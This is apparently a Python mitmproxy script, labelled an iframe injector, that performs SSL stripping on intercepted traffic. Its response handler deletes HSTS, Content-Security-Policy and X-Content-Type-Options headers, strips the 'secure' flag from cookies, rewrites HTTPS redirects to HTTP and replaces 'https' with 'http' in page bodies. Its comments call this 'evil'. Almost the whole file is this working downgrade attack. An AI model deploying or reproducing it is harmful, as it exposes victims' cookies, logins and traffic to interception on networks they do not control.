# Usage: mitmdump -s "iframe_injector.py url"
# (this script works best with --anticache)
from bs4 import BeautifulSoup
import rpdb
from libmproxy.protocol.http import decoded
import urlparse
import re
import socket;

# Thanks stack exchange! Modded from http://stackoverflow.com/questions/14110841/how-do-i-test-if-there-is-a-server-open-on-a-port-with-python
def DoesServiceExist(host, port):
    captive_dns_addr = ""
    host_addr = ""
    try:
        host_addr = socket.gethostbyname(host)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((host, port))
        s.close()
    except:
        return False
    return True

def start(context, argv):
    if len(argv) != 2:
        raise ValueError('Usage: -s "iframe_injector.py url"')
    if len(argv) > 1:
        context.surl = argv[1]
        context.inject = True
        context.log('Script injection enabled!')

def request(context, flow):
    spliturl = urlparse.urlparse(flow.request.url)
    # test that we have 443 on the other side first...
    context.log(DoesServiceExist(spliturl.netloc,443))

    # must have 443 open and responding within 1 second in order to rewrite to https, otherwise we will keep the HTTP that the request came with
    if DoesServiceExist(spliturl.netloc,443) == True and spliturl.scheme == "http" or spliturl.scheme == '':
        flow.request.url = urlparse.urlunparse(('https', spliturl.netloc, spliturl.path, spliturl.params, spliturl.query, spliturl.fragment))
        context.log("Added https to " + flow.request.url)
    # could also make an exception list here for stuff we know just isn't going to work
    else:
        pass

def error(ScriptContext, HTTPFlow):
    pass
    # Ideally i would have liked to retry the service as http without https, but that was difficult to do from this vantage point.
    # check out this for more info: https://github.com/mitmproxy/mitmproxy/blob/master/libmproxy/proxy/server.py
    #context.log(HTTPFlow.request)
    #request = HTTPFlow.request
    #p_request = urlparse.urlparse(request.url)
    #request.url = urlparse.urlunparse(('http',p_request.netloc, p_request.path, p_request.params, p_request.query, p_request.fragment))
    #request.port = 80
    #HTTPFlow.server_conn.connect()
    #HTTPFlow.server_conn.connection.send(HTTPFlow.request.assemble())
    #HTTPFlow.response

#def handle_response(context,response):
#    f = flow.FlowMaster.handle_response(self, r)
#    rpdb.set_trace()
#def handle_request(self, r):
#    f = flow.FlowMaster.handle_request(self, r)
#    rpdb.set_trace()
#    if f:
#        r.reply()
#    return f
       
def response(context, flow):
    strip_flag = False
    if flow.request.host in context.surl:
        return

    # remove strict transport security protections - we are evil now!
    if "Strict-Transport-Security" in flow.response.headers:
        del flow.response.headers['Strict-Transport-Security']

    # we are evil!  Content security policy gets stripped too!
    if "Content-Security-Policy" in flow.response.headers:
        del flow.response.headers['Content-Security-Policy']

    # this is good if we want to start injecting weirdness later on...
    if "X-Content-Type-Options" in flow.response.headers:
        del flow.response.headers['X-Content-Type-Options']

    # We don't want cookies sent to require HTTPS so we remove that flag.    
    if "Set-Cookie" in flow.response.headers:
        flow.response.headers['Set-Cookie'] = [flow.response.headers['Set-Cookie'][0].replace("; secure","")]

    # remove 301/302 redirs to secure portions...we are still evil!
    if flow.response.code == 302 or flow.response.code == 301:
        context.log("Redirect detected")
        spliturl = urlparse.urlparse(flow.response.headers['Location'][0])

        if spliturl.scheme == "https":
            flow.response.headers['Location'] = [urlparse.urlunparse(('http', spliturl.netloc, spliturl.path, spliturl.params, spliturl.query, spliturl.fragment))]
            context.log("REMOVED REDIR HTTPS to " + flow.request.url)

    with decoded(flow.response):
        flow.response.content = flow.response.content.replace('https','http')
